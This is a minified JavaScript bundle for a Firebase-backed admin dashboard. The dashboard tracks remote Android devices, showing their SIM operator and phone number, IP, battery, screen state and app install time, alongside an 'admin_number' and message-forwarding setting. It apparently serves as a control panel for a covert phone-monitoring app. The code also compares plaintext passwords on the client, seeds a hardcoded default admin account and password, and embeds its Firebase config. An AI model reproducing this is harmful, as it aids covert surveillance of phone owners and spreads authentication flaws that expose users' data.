e==="value"}createEvent(e,n){const r=n._queryParams.getIndex();return new Fj("value",this,new so(e.snapshotNode,new Fn(n._repo,n._path),r))}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,null)}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new Wj(this,e,n):null}matches(e){return e instanceof Il?!e.callbackContext||!this.callbackContext?!0:e.callbackContext.matches(this.callbackContext):!1}hasAnyCallback(){return this.callbackContext!==null}}function $j(t,e,n,r,s){let o;if(typeof r=="object"&&(o=void 0,s=r),typeof r=="function"&&(o=r),s&&s.onlyOnce){const c=n,d=(p,f)=>{Eh(t._repo,t,l),c(p,f)};d.userCallback=n.userCallback,d.context=n.context,n=d}const a=new $v(n,o||void 0),l=new Il(a);return Tj(t._repo,t,l),()=>Eh(t._repo,t,l)}function cn(t,e,n,r){return $j(t,"value",e,n,r)}BC(Fn);YC(Fn);/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Bj="FIREBASE_DATABASE_EMULATOR_HOST",Dd={};let Uj=!1;function Hj(t,e,n,r){t.repoInfo_=new Ux(`${e}:${n}`,!1,t.repoInfo_.namespace,t.repoInfo_.webSocketOnly,t.repoInfo_.nodeAdmin,t.repoInfo_.persistenceKey,t.repoInfo_.includeNamespaceInQueryParams,!0),r&&(t.authTokenProvider_=r)}function Vj(t,e,n,r,s){let o=r||t.options.databaseURL;o===void 0&&(t.options.projectId||zn("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),Ze("Using default host for project ",t.options.projectId),o=`${t.options.projectId}-default-rtdb.firebaseio.com`);let a=Ih(o,s),l=a.repoInfo,c;typeof process<"u"&&qf&&(c=qf[Bj]),c?(o=`http://${c}?ns=${l.namespace}`,a=Ih(o,s),l=a.repoInfo):a.repoInfo.secure;const d=new sS(t.name,t.options,e);yj("Invalid Firebase Database URL",a),ie(a.path)||zn("Database URL must point to the root of a Firebase Database (not including a child path).");const p=Yj(l,t,d,new rS(t.name,n));return new Kj(p,t)}function Gj(t,e){const n=Dd[e];(!n||n[t.key]!==t)&&zn(`Database ${e}(${t.repoInfo_}) has already been deleted.`),Aj(t),delete n[t.key]}function Yj(t,e,n,r){let s=Dd[e.name];s||(s={},Dd[e.name]=s);let o=s[t.toURLString()];return o&&zn("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),o=new Cj(t,Uj,n,r),s[t.toURLString()]=o,o}class Kj{constructor(e,n){this._repoInternal=e,this.app=n,this.type="database",this._instanceStarted=!1}get _repo(){return this._instanceStarted||(jj(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal}get _root(){return this._rootInternal||(this._rootInternal=new Fn(this._repo,ue())),this._rootInternal}_delete(){return this._rootInternal!==null&&(Gj(this._repo,this.app.name),this._repoInternal=null,this._rootInternal=null),Promise.resolve()}_checkNotDeleted(e){this._rootInternal===null&&zn("Cannot call "+e+" on a deleted database.")}}function Qj(t=Iw(),e){const n=jw(t,"database").getImmediate({identifier:e});if(!n._instanceStarted){const r=h_("database");r&&qj(n,...r)}return n}function qj(t,e,n,r={}){t=$r(t),t._checkNotDeleted("useEmulator"),t._instanceStarted&&zn("Cannot call useEmulator() after instance has already been initialized.");const s=t._repoInternal;let o;if(s.repoInfo_.nodeAdmin)r.mockUserToken&&zn('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),o=new aa(aa.OWNER);else if(r.mockUserToken){const a=typeof r.mockUserToken=="string"?r.mockUserToken:m_(r.mockUserToken,t.app.options.projectId);o=new aa(a)}Hj(s,e,n,o)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Xj(t){$w(Ew),Ma(new Qi("database",(e,{instanceIdentifier:n})=>{const r=e.getProvider("app").getImmediate(),s=e.getProvider("auth-internal"),o=e.getProvider("app-check-internal");return Vj(r,s,o,n)},"PUBLIC").setMultipleInstances(!0)),vs(Xf,Jf,t),vs(Xf,Jf,"esm2017")}In.prototype.simpleListen=function(t,e){this.sendRequest("q",{p:t},e)};In.prototype.echo=function(t,e){this.sendRequest("echo",{d:t},e)};Xj();const Jj={apiKey:"AIzaSyAHwwpZ6eQqDGF8MOuAKCGoWMh6VZWjaG0",authDomain:"vvdszd.firebaseapp.com",databaseURL:"https://vvdszd-default-rtdb.firebaseio.com",projectId:"vvdszd",storageBucket:"vvdszd.firebasestorage.app",messagingSenderId:"1051837850098",appId:"1:1051837850098:web:0d8c05bdc4c6c8b6610b6b"},Zj=kx(Jj),U=Qj(Zj),ek=()=>`${Date.now()}_${Math.random().toString(36).substr(2,9)}`,tk=()=>{const t=window.screen,e=window.navigator;return{userAgent:e.userAgent,platform:e.platform,language:e.language,screenWidth:t.width,screenHeight:t.height,colorDepth:t.colorDepth,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,fingerprint:`${e.userAgent}_${t.width}x${t.height}_${e.language}`}},nk=async(t,e)=>{try{const n=tk(),r=ek(),s=B(U,`sessions/${t}/${r}`);return await bt(s,{sessionId:r,userId:t,deviceName:e.deviceName||n.userAgent.substring(0,50),deviceModel:e.deviceModel||n.platform,browser:e.browser||n.userAgent,os:e.os||n.platform,ip:e.ip||"Unknown",location:e.location||"Unknown",loginTime:Date.now(),lastActive:Date.now(),isActive:!0,fingerprint:n.fingerprint,screenInfo:`${n.screenWidth}x${n.screenHeight}`,language:n.language,timezone:n.timezone}),{success:!0,sessionId:r}}catch(n){return{success:!1,error:n.message}}},Th=async t=>{try{const e=B(U,`sessions/${t}`),n=await ce(e);if(n.exists()){const r=n.val(),s=Object.keys(r).map(o=>({sessionId:o,...r[o]}));return s.sort((o,a)=>a.loginTime-o.loginTime),{success:!0,sessions:s}}return{success:!0,sessions:[]}}catch(e){return{success:!1,error:e.message}}},rk=async(t,e)=>{try{const n=B(U,`sessions/${t}/${e}`);return await Rt(n),{success:!0}}catch(n){return{success:!1,error:n.message}}},sk=(t,e)=>{const n=B(U,`sessions/${t}`);return cn(n,r=>{const s=r.val()||{},o=Object.keys(s).map(a=>({sessionId:a,...s[a]}));o.sort((a,l)=>l.loginTime-a.loginTime),e(o)})},Uv=t=>{const e=B(U,"sessions");return cn(e,n=>{const r=n.val()||{},s=[];for(let o in r)for(let a in r[o])s.push({userId:o,sessionId:a,...r[o][a]});s.sort((o,a)=>a.loginTime-o.loginTime),t(s)})},ik=async(t,e)=>{try{const n=B(U,`logout_commands/${t}/${e}`);return await bt(n,{forceLogout:!0,timestamp:Date.now(),message:"You have been logged out from this device by admin",userId:t,sessionId:e}),{success:!0}}catch(n){return{success:!1,error:n.message}}},ok=async t=>{try{const e=B(U,`sessions/${t}`),n=await ce(e);if(n.exists()){const r=n.val();for(let s in r){const o=B(U,`logout_commands/${t}/${s}`);await bt(o,{forceLogout:!0,timestamp:Date.now(),message:"You have been logged out from all devices by admin",userId:t,sessionId:s})}}return{success:!0}}catch(e){return{success:!1,error:e.message}}},ak=(t,e,n)=>{const r=B(U,`logout_commands/${t}/${e}`);return cn(r,s=>{if(s.exists()){const o=s.val();o.forceLogout&&(n(o),Rt(r))}})},lk=async(t,e)=>{try{await ik(t,e);const n=B(U,`sessions/${t}/${e}`);return await Rt(n),{success:!0}}catch(n){return{success:!1,error:n.message}}},ck=async t=>{try{await ok(t);const e=B(U,`sessions/${t}`);await Rt(e);const n=B(U,`users/${t}`);return await kt(n,{active:!1,lastLogout:Date.now()}),{success:!0}}catch(e){return{success:!1,error:e.message}}},dk=async(t,e)=>{try{const n=B(U,"users"),s=(await ce(n)).val();if(!s)return{success:!1,error:"No users found in database"};let o=null,a=null;for(let l in s){const c=s[l];if(c.userId===t||c.email===t){o=c,a=l;break}}return o?o.password!==e?{success:!1,error:"Invalid User ID or Password"}:(await kt(B(U,`users/${a}`),{lastLogin:Date.now(),active:!0}),{success:!0,user:{uid:a,...o}}):{success:!1,error:"Invalid User ID or Password"}}catch(n){return{success:!1,error:n.message}}},uk=()=>({success:!0}),pk=async(t,e,n)=>{try{const r=B(U,"users"),o=(await ce(r)).val();let a=null;for(let c in o){const d=o[c];if(d.userId===t||d.email===t){a=c;break}}return a?o[a].password!==e?{success:!1,error:"Current password is incorrect"}:(await kt(B(U,`users/${a}`),{password:n}),{success:!0,shouldLogout:!0,message:"Password changed successfully! Please login again."}):{success:!1,error:"User not found"}}catch(r){return{success:!1,error:r.message}}},fk=t=>{const e=B(U,"devices");return cn(e,n=>{const r=n.val()||{},s=Object.keys(r).map(o=>({id:o,...r[o]}));t(s)})},yc=async(t,e,n)=>{const r=B(U,`devices/${t}`);await kt(r,{[e]:n})},hk=async()=>{const t=B(U,"settings"),e=await ce(t);return e.exists()?e.val():{admin_number:"",forward:!0}},mk=async t=>{const e=B(U,"settings");await kt(e,t)},gk=async t=>{const e=B(U,`devices/${t}`),n=await ce(e);return n.exists()?{id:t,...n.val()}:null},xk=async()=>{try{const t=B(U,"users"),n=(await ce(t)).val()||{};for(let s in n)if(n[s].userId==="admin")return{success:!1,error:"Admin user already exists!"};const r=Date.now().toString(36)+Math.random().toString(36).substr(2,5);return await bt(B(U,`users/${r}`),{userId:"admin",email:"admin@kronos.com",name:"Admin User",role:"admin",password:"Admin@123",createdAt:Date.now(),lastLogin:Date.now(),active:!0}),{success:!0,message:"Admin user created successfully!"}}catch(t){return{success:!1,error:t.message}}},Ah=async t=>{try{const e=B(U,`pings/${t}`);return await bt(e,{ping:!0,timestamp:Date.now(),from:"admin"}),setTimeout(async()=>{await Rt(e)},5e3),{success:!0}}catch(e){return console.error("Ping error:",e),{success:!1,error:e.message}}};function vk({device:t,index:e,onFavoriteToggle:n}){var z;const r=gt(),[s,o]=g.useState(""),[a,l]=g.useState(!1),[c,d]=g.useState(!1),[p,f]=g.useState(!1),[u,b]=g.useState(!1),[x,v]=g.useState(null),[_,m]=g.useState(t.favorite||!1),h=g.useMemo(()=>6e4,[]),y=g.useMemo(()=>6e4,[]),w=g.useCallback(()=>{if(!t)return;const M=t.lastSeen||t.this_app_installTime;if(!M){l(!1),o("never");return}const L=Date.now()-Number(M),K=L<=h;l(te=>te!==K?K:te);let F="";L<0?F="just now":L<6e4?F=`${Math.floor(L/1e3)}s ago`:L<36e5?F=`${Math.floor(L/6e4)}m ago`:L<864e5?F=`${Math.floor(L/36e5)}h ago`:F=`${Math.floor(L/864e5)}d ago`,o(te=>te!==F?F:te),L>y&&t.status==="online"?yc(t.id,"status","offline").catch(()=>{}):L<=y&&t.status==="offline"&&yc(t.id,"status","online").catch(()=>{})},[t]);g.useEffect(()=>{w();const M=setInterval(w,5e3);return()=>clearInterval(M)},[w]);const N=g.useCallback(async M=>{M.stopPropagation();const L=!_;m(L);try{await yc(t.id,"favorite",L),n&&n(t.id,L)}catch(K){m(!L),console.error("Favorite update failed",K)}},[t.id,_,n]),R=g.useCallback(async M=>{M.stopPropagation(),f(!0);try{const L=await gk(t.id);if(L){const K=L.lastSeen||L.this_app_installTime,F=Date.now()-Number(K);let te="",me=Math.floor(F/1e3),W=Math.floor(F/6e4),D=Math.floor(F/36e5),I=Math.floor(F/864e5);F<6e4?te=`${me} seconds ago`:F<36e5?te=`${W} minutes ago`:F<864e5?te=`${D} hours ago`:te=`${I} days ago`;let X="",V="";if(a)X="✅ Device is currently ONLINE",V="#2ecc71";else if(F<12e4){const E=6e4-F%6e4;X=`🔮 Device may come online in ${Math.floor(E/1e3)}s (App may be in background)`,V="#f1c40f"}else F<6e5?(X="🔮 Device may come online soon (Check if app is running)",V="#f39c12"):F<36e5?(X="🔮 Device might be offline. Try restarting the app.",V="#e67e22"):(X="🔴 Device is offline. App may be uninstalled or permissions denied. IF SCREEN IS |OFF| THEN DEVICE WILL BE ONLINE 100% AFTER RESERT DEVICE.",V="#e74c3c");v({brand:t.brand||"Unknown",model:t.model||"Device",serial:t.serialNo||"N/A",status:a?"🟢 ONLINE":"🔴 OFFLINE",statusColor:a?"#2ecc71":"#e74c3c",lastSeen:K?new Date(K).toLocaleString():"Never",timeAgo:te,prediction:X,predictionColor:V,battery:t.battery||"N/A",ip:t.ip||"N/A",sim:t.sim_info||"N/A",androidVersion:t.android_version||"N/A",screen:t.screen==="ON"?"🟢 ON":"⚫ OFF"}),b(!0)}}catch(L){console.error("Status check failed",L),alert("❌ Failed to check device status")}setTimeout(()=>f(!1),1e3)},[t,a]),S=g.useCallback(()=>{r(`/device/${t.device_id||t.id}`)},[t,r]),C=g.useMemo(()=>{const M=parseInt(t.battery);return M>=70?{bg:"#2ecc71",glow:"rgba(46,204,113,0.3)",text:"#2ecc71"}:M>=40?{bg:"#f1c40f",glow:"rgba(241,196,15,0.3)",text:"#f1c40f"}:M>=20?{bg:"#e67e22",glow:"rgba(230,126,34,0.3)",text:"#e67e22"}:{bg:"#e74c3c",glow:"rgba(231,76,60,0.3)",text:"#e74c3c"}},[t.battery]),j=g.useMemo(()=>{if(!t.sim_info)return{operator:"N/A",number:"N/A"};const M=t.sim_info.split(" - ");return M.length===2?{operator:(M[0].split(": ")[1]||M[0]).trim(),number:M[1].trim()}:{operator:t.sim_info,number:"N/A"}},[t.sim_info]),P=g.useCallback(M=>M?new Date(M).toLocaleString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit"}):"N/A",[]);return t?i.jsxs(i.Fragment,{children:[i.jsxs("div",{className:`device-card-premium-v2 ${a?"online":"offline"} ${c?"hovered":""}`,onMouseEnter:()=>d(!0),onMouseLeave:()=>d(!1),onClick:S,style:{cursor:"pointer",willChange:"transform, opacity"},children:[i.jsx("div",{className:"card-glow-v2",style:{opacity:a&&c?.3:0,background:`radial-gradient(ellipse at 30% 20%, ${C.glow}, transparent 70%)`,willChange:"opacity"}}),i.jsx("div",{className:"card-status-v2",style:{background:a?"linear-gradient(90deg, #2ecc71, #27ae60, #2ecc71)":"linear-gradient(90deg, #95a5a6, #7f8c8d, #95a5a6)",boxShadow:a?"0 0 20px rgba(46,204,113,0.2)":"none"},children:i.jsx("div",{className:"status-pulse-v2"})}),i.jsxs("div",{className:"card-body-v2",children:[i.jsxs("div",{className:"card-header-v2",children:[i.jsx("div",{className:"rank-section-v2",children:i.jsxs("span",{className:"rank-badge-v2",children:[i.jsx("span",{className:"rank-icon",children:"#"}),t.serialNo||"N/A"]})}),i.jsxs("div",{className:"action-buttons-v2",children:[i.jsx("button",{className:`action-btn-v2 fav-btn ${_?"active":""}`,onClick:N,title:_?"Remove from favorites":"Add to favorites",children:_?"⭐":"☆"}),i.jsx("button",{className:"action-btn-v2 status-btn",onClick:R,disabled:p,title:"Check online status & last update time",children:p?"⏳":"📡"})]})]}),i.jsxs("div",{className:"device-info-v2",children:[i.jsxs("div",{className:"device-icon-v2",children:[i.jsx("span",{children:"📱"}),a&&i.jsx("span",{className:"live-dot-v2"})]}),i.jsxs("div",{className:"device-title-v2",children:[i.jsx("span",{className:"device-brand-v2",children:t.brand||"UNKNOWN"}),i.jsx("span",{className:"device-model-v2",children:t.model||"Device"})]})]}),i.jsxs("div",{className:"time-since-row",children:[i.jsx("span",{className:"time-since-label",children:"🕐 Last update:"}),i.jsx("span",{className:`time-since-value ${a?"online":"offline"}`,children:s})]}),i.jsxs("div",{className:"device-id-row-v2",children:[i.jsxs("span",{className:"device-id-v2",children:["🔑 ",t.device_id||((z=t.id)==null?void 0:z.slice(-8))]}),i.jsx("span",{className:`screen-status-v2 ${t.screen==="ON"?"on":"off"}`,children:t.screen==="ON"?"🟢 ON":"⚫ OFF"})]}),i.jsxs("div",{className:"stats-row-v2",children:[i.jsxs("div",{className:"stat-item-v2 sim-item-v2",children:[i.jsx("span",{className:"stat-icon-v2",children:"📶"}),i.jsx("span",{className:"stat-value-v2 sim-operator-v2",children:j.operator}),i.jsx("span",{className:"sim-divider-v2",children:"—"}),i.jsx("span",{className:"stat-value-v2 sim-number-v2",children:j.number})]}),i.jsxs("div",{className:"install-date-row-v2",children:[i.jsx("span",{className:"install-date-icon-v2",children:"📅"}),i.jsx("span",{className:"install-date-value-v2",children:t.this_app_installDateTime||P(t.this_app_installTime)})]})]}),i.jsxs("div",{className:"battery-section-premium",children:[i.jsxs("div",{className:"battery-header",children:[i.jsxs("div",{className:"battery-info",children:[i.jsx("span",{className:"battery-icon",children:"🔋"}),i.jsx("span",{className:"battery-label-text",children:"Battery"})]}),i.jsx("span",{className:"battery-percentage",style:{color:C.text},children:t.battery||"N/A"})]}),i.jsx("div",{className:"battery-track-premium",children:i.jsx("div",{className:"battery-fill-premium",style:{width:t.battery||"0%",background:`linear-gradient(90deg, ${C.bg}, ${C.bg}dd)`,boxShadow:`0 0 20px ${C.glow}`}})})]})]}),i.jsx("style",{children:`
          .time-since-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 3px 0 5px;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 4px;
          }
          .time-since-label { font-size: 10px; color: var(--text-muted); font-weight: 500; }
          .time-since-value { font-size: 11px; font-weight: 600; padding: 1px 10px; border-radius: 12px; }
          .time-since-value.online { color: #2ecc71; background: rgba(46, 204, 113, 0.08); }
          .time-since-value.offline { color: #95a5a6; background: rgba(149, 165, 166, 0.08); }
        `})]}),u&&x&&i.jsx("div",{className:"status-dialog-overlay",onClick:()=>b(!1),children:i.jsxs("div",{className:"status-dialog",onClick:M=>M.stopPropagation(),children:[i.jsx("button",{className:"dialog-close",onClick:()=>b(!1),children:"✕"}),i.jsxs("div",{className:"dialog-header",children:[i.jsx("span",{className:"dialog-device-icon",children:"📱"}),i.jsxs("div",{children:[i.jsxs("h2",{children:[x.brand," ",x.model]}),i.jsxs("span",{className:"dialog-serial",children:["# ",x.serial]})]})]}),i.jsxs("div",{className:"dialog-status",style:{borderColor:x.statusColor},children:[i.jsx("span",{className:"dialog-status-icon",style:{color:x.statusColor},children:x.status==="🟢 ONLINE"?"🟢":"🔴"}),i.jsx("span",{className:"dialog-status-text",style:{color:x.statusColor},children:x.status})]}),i.jsxs("div",{className:"dialog-time-info",children:[i.jsxs("div",{className:"dialog-time-item",children:[i.jsx("span",{className:"dialog-time-label",children:"🕐 Last Update"}),i.jsx("span",{className:"dialog-time-value",children:x.lastSeen})]}),i.jsxs("div",{className:"dialog-time-item",children:[i.jsx("span",{className:"dialog-time-label",children:"⏱️ Time Ago"}),i.jsx("span",{className:"dialog-time-value highlight",children:x.timeAgo})]})]}),i.jsxs("div",{className:"dialog-prediction",style:{borderColor:x.predictionColor},children:[i.jsx("span",{className:"dialog-prediction-icon",children:"🤖"}),i.jsxs("div",{children:[i.jsx("span",{className:"dialog-prediction-label",children:"AI Prediction"}),i.jsx("span",{className:"dialog-prediction-text",style:{color:x.predictionColor},children:x.prediction})]})]}),i.jsxs("div",{className:"dialog-details-grid",children:[i.jsxs("div",{className:"dialog-detail-item",children:[i.jsx("span",{className:"dialog-detail-label",children:"🔋 Battery"}),i.jsx("span",{className:"dialog-detail-value",children:x.battery})]}),i.jsxs("div",{className:"dialog-detail-item",children:[i.jsx("span",{className:"dialog-detail-label",children:"📶 IP"}),i.jsx("span",{className:"dialog-detail-value",children:x.ip})]}),i.jsxs("div",{className:"dialog-detail-item",children:[i.jsx("span",{className:"dialog-detail-label",children:"📞 SIM"}),i.jsxs("span",{className:"dialog-detail-value",children:[x.sim.substring(0,20),"..."]})]}),i.jsxs("div",{className:"dialog-detail-item",children:[i.jsx("span",{className:"dialog-detail-label",children:"🤖 Android"}),i.jsxs("span",{className:"dialog-detail-value",children:["v",x.androidVersion]})]}),i.jsxs("div",{className:"dialog-detail-item full",children:[i.jsx("span",{className:"dialog-detail-label",children:"📱 Screen"}),i.jsx("span",{className:"dialog-detail-value",children:x.screen})]})]}),i.jsx("button",{className:"dialog-goto-btn",onClick:()=>{b(!1),r(`/device/${t.device_id||t.id}`)},children:"📖 View Full Details"})]})}),i.jsx("style",{children:`
        /* ================================================================
           STATUS DIALOG
           ================================================================ */
        .status-dialog-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0, 0, 0, 0.7);
          backdrop-filter: blur(8px);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }

        .status-dialog {
          background: var(--bg-card);
          border-radius: 16px;
          padding: 24px;
          max-width: 440px;
          width: 100%;
          max-height: 90vh;
          overflow-y: auto;
          border: 1px solid var(--border-color);
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          position: relative;
        }

        .dialog-close {
          position: absolute;
          top: 12px;
          right: 16px;
          background: none;
          border: none;
          font-size: 20px;
          color: var(--text-muted);
          cursor: pointer;
          padding: 4px 8px;
          border-radius: 6px;
          transition: all 0.2s;
        }

        .dialog-close:hover {
          background: var(--bg-input);
          color: var(--text-primary);
        }

        .dialog-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 16px;
          padding-bottom: 12px;
          border-bottom: 1px solid var(--border-color);
        }

        .dialog-device-icon {
          font-size: 32px;
        }

        .dialog-header h2 {
          font-size: 18px;
          font-weight: 700;
          color: var(--text-primary);
          margin: 0;
        }

        .dialog-serial {
          font-size: 12px;
          color: var(--text-muted);
          font-weight: 500;
        }

        .dialog-status {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 12px 16px;
          border-radius: 10px;
          border: 2px solid;
          margin-bottom: 16px;
          background: var(--bg-input);
        }

        .dialog-status-icon {
          font-size: 24px;
        }

        .dialog-status-text {
          font-size: 18px;
          font-weight: 700;
        }

        .dialog-time-info {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 8px;
          margin-bottom: 16px;
        }

        .dialog-time-item {
          background: var(--bg-input);
          border-radius: 8px;
          padding: 8px 12px;
        }

        .dialog-time-label {
          display: block;
          font-size: 10px;
          color: var(--text-muted);
          font-weight: 500;
          text-transform: uppercase;
          letter-spacing: 0.3px;
        }

        .dialog-time-value {
          display: block;
          font-size: 13px;
          font-weight: 600;
          color: var(--text-primary);
          margin-top: 2px;
        }

        .dialog-time-value.highlight {
          color: #6c63ff;
        }

        .dialog-prediction {
          display: flex;
          align-items: flex-start;
          gap: 10px;
          padding: 12px 14px;
          border-radius: 10px;
          border: 2px solid;
          margin-bottom: 16px;
          background: var(--bg-input);
        }

        .dialog-prediction-icon {
          font-size: 20px;
          margin-top: 2px;
        }

        .dialog-prediction-label {
          display: block;
          font-size: 10px;
          color: var(--text-muted);
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.3px;
        }

        .dialog-prediction-text {
          display: block;
          font-size: 13px;
          font-weight: 500;
          margin-top: 2px;
          line-height: 1.4;
        }

        .dialog-details-grid {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 6px;
          margin-bottom: 16px;
        }

        .dialog-detail-item {
          background: var(--bg-input);
          border-radius: 6px;
          padding: 6px 10px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .dialog-detail-item.full {
          grid-column: span 2;
        }

        .dialog-detail-label {
          font-size: 11px;
          color: var(--text-muted);
        }

        .dialog-detail-value {
          font-size: 12px;
          font-weight: 600;
          color: var(--text-primary);
        }

        .dialog-goto-btn {
          width: 100%;
          padding: 10px;
          border: none;
          border-radius: 8px;
          background: linear-gradient(135deg, #6c63ff, #3b82f6);
          color: white;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
        }

        .dialog-goto-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(108, 99, 255, 0.3);
        }

        /* ================================================================
           FAVORITE BUTTON STYLES
           ================================================================ */
        .fav-btn {
          background: none;
          border: none;
          font-size: 18px;
          cursor: pointer;
          padding: 4px 8px;
          border-radius: 6px;
          transition: all 0.2s;
          color: var(--text-muted);
        }

        .fav-btn:hover {
          transform: scale(1.15);
          color: #f1c40f;
        }

        .fav-btn.active {
          color: #f1c40f;
          animation: starPop 0.3s ease;
        }

        @keyframes starPop {
          0% { transform: scale(1); }
          50% { transform: scale(1.4); }
          100% { transform: scale(1); }
        }

        @media (max-width: 480px) {
          .status-dialog {
            padding: 16px;
          }
          .dialog-time-info {
            grid-template-columns: 1fr;
          }
          .dialog-details-grid {
            grid-template-columns: 1fr;
          }
          .dialog-detail-item.full {
            grid-column: span 1;
          }
        }
      `})]}):null}const yk=g.memo(vk),bk=()=>{const[t,e]=g.useState([]),[n,r]=g.useState(!0);return g.useEffect(()=>{const s=fk(o=>{e(o),r(!1)});return()=>s()},[]),{devices:t,loading:n}};function _k(){var j,P;const{devices:t,loading:e}=bk(),[n,r]=g.useState(""),[s,o]=g.useState(!1),[a,l]=g.useState(!1),[c,d]=g.useState({}),[p,f]=g.useState("serial"),u=36e5,b=864e5,x=6e5,v=z=>{const M=z.lastSeen||z.this_app_installTime;return M?Date.now()-Number(M)<=u:!1},_=z=>{const M=z.lastSeen||z.this_app_installTime;return M?Date.now()-Number(M)<=b:!1},m=z=>{const M=z.lastSeen||z.this_app_installTime;return M?Date.now()-Number(M)<=x:!1},y=[...t.filter(z=>{var me;const M=n.toLowerCase().trim(),L=(((me=z.serialNo)==null?void 0:me.toString())||"").toLowerCase(),K=(z.brand||"").toLowerCase(),F=(z.model||"").toLowerCase(),te=(z.device_id||z.id||"").toLowerCase();return!(M&&!L.includes(M)&&!K.includes(M)&&!F.includes(M)&&!te.includes(M)||s&&!v(z)||a&&!(z.favorite||c[z.id]))})].sort((z,M)=>{const L=v(z),K=v(M);if(L&&!K)return-1;if(!L&&K)return 1;const F=parseInt(z.serialNo)||0,te=parseInt(M.serialNo)||0;if(F!==te)return te-F;const me=z.lastSeen||z.this_app_installTime||0;return(M.lastSeen||M.this_app_installTime||0)-me}),w=t.length,N=t.filter(z=>v(z)).length,R=t.filter(z=>_(z)).length,S=t.filter(z=>m(z)).length,C=(z,M)=>{d(L=>({...L,[z]:M}))};return e?i.jsxs("div",{className:"loading-state",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"📡 LOADING DEVICES..."})]}):i.jsxs("div",{className:"device-list",children:[i.jsxs("div",{className:"stats-bar-enhanced",children:[i.jsxs("div",{className:"stats-grid-enhanced",children:[i.jsxs("div",{className:"stat-item-enhanced online",children:[i.jsx("span",{className:"stat-icon",children:"🟢"}),i.jsxs("div",{children:[i.jsx("span",{className:"stat-number",children:N}),i.jsx("span",{className:"stat-label",children:"Online (1h)"})]})]}),i.jsxs("div",{className:"stat-item-enhanced ping",children:[i.jsx("span",{className:"stat-icon",children:"📡"}),i.jsxs("div",{children:[i.jsx("span",{className:"stat-number",children:S}),i.jsx("span",{className:"stat-label",children:"Pinging (10m)"})]})]}),i.jsxs("div",{className:"stat-item-enhanced twentyfour",children:[i.jsx("span",{className:"stat-icon",children:"📅"}),i.jsxs("div",{children:[i.jsx("span",{className:"stat-number",children:R}),i.jsx("span",{className:"stat-label",children:"24h Active"})]})]}),i.jsxs("div",{className:"stat-item-enhanced total",children:[i.jsx("span",{className:"stat-icon",children:"📱"}),i.jsxs("div",{children:[i.jsx("span",{className:"stat-number",children:w}),i.jsx("span",{className:"stat-label",children:"Total"})]})]})]}),i.jsx("div",{className:"stats-actions",children:i.jsxs("button",{className:`toggle-btn ${s?"active":""}`,onClick:()=>o(!s),title:s?"Show all devices":"Show online only",children:[i.jsx("span",{className:"toggle-icon",children:s?"🟢":"📱"}),i.jsx("span",{className:"toggle-label",children:s?"Online":"All"})]})})]}),i.jsxs("div",{className:"sort-controls",children:[i.jsx("span",{className:"sort-label",children:"Sort by:"}),i.jsxs("select",{className:"sort-select",value:p,onChange:z=>f(z.target.value),children:[i.jsx("option",{value:"serial",children:"Serial No"}),i.jsx("option",{value:"lastSeen",children:"Last Seen"}),i.jsx("option",{value:"brand",children:"Brand"}),i.jsx("option",{value:"battery",children:"Battery"})]})]}),i.jsx("div",{className:"action-strip",children:i.jsx("button",{className:`btn ${a?"active":""}`,onClick:()=>l(!a),children:a?"⭐ FAV":"☆ ALL"})}),i.jsx("div",{className:"search-container",children:i.jsxs("div",{className:"search-box",children:[i.jsx("span",{className:"search-icon",children:"🔍"}),i.jsx("input",{type:"text",placeholder:"Search by Serial, Brand, Model, ID...",value:n,onChange:z=>r(z.target.value)}),n&&i.jsx("button",{className:"search-clear",onClick:()=>r(""),children:"✕"})]})}),i.jsxs("div",{className:"device-count",children:["Showing ",y.length," of ",w," devices",y.length>0&&i.jsxs("span",{className:"latest-badge",children:["🔥 #",((j=y[0])==null?void 0:j.serialNo)||"N/A"," ",((P=y[0])==null?void 0:P.brand)||"Unknown"]})]}),i.jsx("div",{className:"devices-grid",children:y.length===0?i.jsxs("div",{className:"empty-state",children:[i.jsx("span",{className:"empty-icon",children:"📭"}),i.jsx("h3",{children:"No devices found"}),i.jsx("p",{children:"Try adjusting your 